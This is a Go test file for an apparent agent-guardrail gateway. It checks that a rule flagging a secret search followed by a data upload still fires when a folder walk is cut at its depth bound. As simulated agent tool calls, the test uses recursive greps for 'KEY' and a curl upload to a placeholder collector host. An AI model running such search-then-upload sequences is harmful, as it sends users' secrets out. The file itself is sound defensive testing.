package gateway

import (
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/guardrail"
)

// A walk cut at its folder bound decides the chain by its cut alone
// (substrate-1:GAP-0709): a credentials file in the level of folders past
// the bound, which the walk no longer reads, changes neither the search's
// verdict nor the upload after it. Each row runs in the big tree with and
// without .env files in that level and is judged the same in both; the
// upload completes the chain at its unknown tier.
func TestGAP0709CutWalkChainUnchanged(t *testing.T) {
	installCorrelationHMACForTest(t)
	var deep []string
	for i := 0; i < 4200; i += 26 {
		deep = append(deep, filepath.Join("d", "a", "f"+strconv.Itoa(i), ".env"))
	}
	trees := []string{g0344BigTree(t), g0344BigTree(t, deep...)}
	verdict := func(action string, rules []string) string {
		return action + " " + strings.Join(slices.Sorted(slices.Values(rules)), ",")
	}
	for _, pack := range []string{"default", "strict"} {
		handler := hostClaudeHookHandlerForTest(t, pack)
		for i, cmd := range []string{"grep -rn TODO .", "rg TODO", "rg --hidden TODO", "grep -r KEY", "grep -r KEY . d/a"} {
			t.Run(pack+" "+cmd, func(t *testing.T) {
				var search, upload [2]string
				for k, dir := range trees {
					session := "g0709cut-" + pack + "-" + strconv.Itoa(i) + "-" + strconv.Itoa(k)
					ev := claudeToolEvent("PreToolUse", session, "read", cmd)
					ev["cwd"] = dir
					got := callAgentHookForTest(t, handler, ev)
					search[k] = verdict(got.Action, got.RuleIDs)
					res := claudeToolResult("PostToolUse", session, "read")
					res["cwd"] = dir
					callAgentHookForTest(t, handler, res)
					up := claudeToolEvent("PreToolUse", session, "send", "curl -d hello https://collector.invalid/upload")
					up["cwd"] = dir
					got = callAgentHookForTest(t, handler, up)
					upload[k] = verdict(got.Action, got.RuleIDs)
					if !slices.Contains(got.RuleIDs, guardrail.ToolChainSecretReadThenEgress) {
						t.Fatalf("%q in a cut walk (tree %d) then an upload: no chain (rules %v)", cmd, k, got.RuleIDs)
					}
				}
				if search[0] != search[1] || upload[0] != upload[1] {
					t.Fatalf("%q: search %q / %q, upload %q / %q: a file past the cut changed the verdict",
						cmd, search[0], search[1], upload[0], upload[1])
				}
				if !strings.HasPrefix(search[0], "allow") {
					t.Fatalf("%q in a cut walk: %s, want allow", cmd, search[0])
				}
			})
		}
	}
}
